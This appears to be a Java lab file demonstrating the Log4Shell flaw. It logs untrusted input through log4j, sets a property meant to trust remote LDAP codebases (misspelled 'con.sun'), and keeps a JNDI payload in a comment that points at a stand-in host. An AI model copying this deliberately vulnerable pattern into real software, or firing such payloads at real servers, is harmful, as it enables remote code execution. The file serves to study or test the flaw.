package org.example;

import org.apache.log4j.Logger;
import org.apache.log4j.LogManager;
import java.util.Scanner;


public class App {
    final static Logger logger = Logger.getLogger(App.class);

    public static void main(String[] args) {
    	
    	System.setProperty("con.sun.jndi.ldap.object.trustURLCodebase","true");
    	 
        //${jndi:ldap://hax.local:1389/Basic/Command/Base64/Y2FsYy5leGU=}

            // vulnerable code
    		String userName = args[0];
            logger.error(userName);

        
    }
}
